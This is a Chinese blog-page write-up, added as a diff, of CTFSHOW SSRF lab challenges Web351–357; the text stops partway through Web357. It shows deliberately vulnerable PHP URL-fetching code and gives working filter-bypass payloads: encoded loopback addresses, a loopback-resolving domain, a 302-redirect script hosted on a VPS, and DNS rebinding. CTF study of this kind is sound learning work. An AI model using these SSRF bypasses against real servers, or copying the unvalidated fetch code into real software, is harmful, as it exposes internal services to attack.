@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>CTFSHOW-SSRF - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="CTFSHOW-SSRF - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/02/CTFSHOW-SSRF/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T09:26:08.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">CTFSHOW-SSRF</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h2 id="Web351（无过滤）"><a href="#Web351（无过滤）" class="headerlink" title="Web351（无过滤）"></a>Web351（无过滤）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先介绍一下<code>curl</code>函数三件套：</p>
+<ul>
+<li><p><code>curl_init</code>:初始化一个Curl会话，里面一般是放URL地址，也可以放在<code>curl_setopt</code>里面的选项内</p>
+</li>
+<li><p><code>curl_setopt</code>:设置curl会话的选项，比如<code>CURLOPT_HEADER, 0</code>表示将头文件的信息作为数据流输出。这里没有启用</p>
+<p><code>CURLOPT_RETURNTRANSFER，1</code>将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</p>
+</li>
+<li><p><code>curl_exec</code>:执行curl会话</p>
+</li>
+<li><p><code>curl_close</code>:关闭curl会话，这样说应该是四剑客</p>
+</li>
+</ul>
+<p>所以这一题的payload很简单：</p>
+<p>扫目录会发现有flag.php但是提示不是本地用户不让访问，所以这就是SSRF漏洞<code>url=127.0.0.1://flag.php</code></p>
+<h2 id="Web352（开始过滤啦）"><a href="#Web352（开始过滤啦）" class="headerlink" title="Web352（开始过滤啦）"></a>Web352（开始过滤啦）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>parse_url</code>：解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5c75aa001957305ace15d4aaa22a482f.png" alt="image-20210908085752772"></p>
+<p>也就是说这一题我们的host不能写127.0.0.1或者是localhost，协议要是http或者https，绕过127.0.0.1的方法有很多：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php </span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://2130706433/flag.php #十进制</span><br><span class="line">url=http://017700000001/flag.php #八进制</span><br><span class="line">url=http://0b1111111000000000000000000000001/flag.php #二进制</span><br><span class="line">url=http://0x7f.0.0.1/flag.php #十六进制</span><br><span class="line">url=http://0177.0.0.1/flag.php #八进制另类</span><br><span class="line">url=http://localhost/flag.php</span><br><span class="line">url=http://127.127.127.127/flag.php</span><br><span class="line">url=http://[::]:80/flag.php #不太理解，而且貌似不行？</span><br><span class="line">127。0。0。1 &gt;&gt;&gt; 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>上面选一种作为payload即可嘻嘻</p>
+<h2 id="Web353"><a href="#Web353" class="headerlink" title="Web353"></a>Web353</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了<code>127.0.</code>,<code>。</code>，<code>localhost</code></p>
+<p>我们用<code>url=http://0/flag.php</code>即可</p>
+<h2 id="Web354（302重定向）"><a href="#Web354（302重定向）" class="headerlink" title="Web354（302重定向）"></a>Web354（302重定向）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ban了0和1就问你怎么说，啥都用不成，这一提交就考查302重定向</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006155738389.png" alt="image-20221006155738389"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006155743136.png" alt="image-20221006155743136"></p>
+<p>方法一：</p>
+<p>在自己的域名中添加一条A记录指向 127.0.0.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">或者使用 http://sudo.cc这个域名就是指向127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>所以payload就是<code>http://sudo.cc/flag.php</code></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006160103117.png" alt="image-20221006160103117"></p>
+<p>方法二：<br>在自己的VPS网站页面添加ssrf.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location:http://127.0.0.1/flag.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>http://yourdomain/ssrf.php</code></p>
+<p>方法三：<br>利用去DNS重定向<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
+<p>先注册一个账号然后点击Profile：<br><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006155938722.png" alt="image-20221006155938722"></p>
+<p>在最下面的DNS-REBINDING选择要绑定的dns即可</p>
+<p>最后payload为：最前面记得要加r!!!!</p>
+<p><code>url=http://r.hba3zw.ceye.io/flag.php</code></p>
+<p>如果给的域名中有0或者1就不可以了</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006160052515.png" alt="image-20221006160052515"></p>
+<h2 id="Web355"><a href="#Web355" class="headerlink" title="Web355"></a>Web355</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这边只要求host&lt;&#x3D;5即可，host就是<code>127.0.0.1</code></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://0/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006160335766.png" alt="image-20221006160335766"></p>
+<h2 id="Web356"><a href="#Web356" class="headerlink" title="Web356"></a>Web356</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>长度小于等于3即可，这里直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line"># 0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Web357（重定向）"><a href="#Web357（重定向）" class="headerlink" title="Web357（重定向）"></a>Web357（重定向）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>gethostbyname:</li>
+</ul>
+<p>  这道题用这个函数获取了真实ip，所以域名指向方法不能再使用，可以使用 302 跳转方法和 dns rebinding 方法</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gethostbyname — 返回主机名对应的 IPv4地址</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>filter_var():</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php filter函数</span></span><br><span class="line"><span class="title function_ invoke__">filter_var</span>()	获取一个变量，并进行过滤</span><br><span class="line"><span class="title function_ invoke__">filter_var_array</span>()	获取多个变量，并进行过滤</span><br><span class="line">......</span><br><span class="line"><span class="comment"># PHP 过滤器</span></span><br><span class="line">FILTER_VALIDATE_IP	把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围</span><br><span class="line">FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 <span class="number">255.255</span>.<span class="number">255.255</span>）</span><br><span class="line">FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 <span class="number">2001</span>:<span class="number">0</span>db8:<span class="number">85</span>a3:<span class="number">08</span>d3:<span class="number">1319</span>:<span class="number">8</span>a2e:<span class="number">0370</span>:<span class="number">7334</span>）</span><br><span class="line">FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 <span class="number">192.168</span>.<span class="number">0.1</span>）</span><br><span class="line">FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可保留的ip如下：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/de29ade97ea566398b137c78fc0100e8.png" alt="image-20210908093219443"></p>
+</li>
+</ul>
+<p>我自己买的腾讯云ip不在这范围内所以可以</p>
+<p>在自己的vps写一下ssrf.php,重定向文件</p>
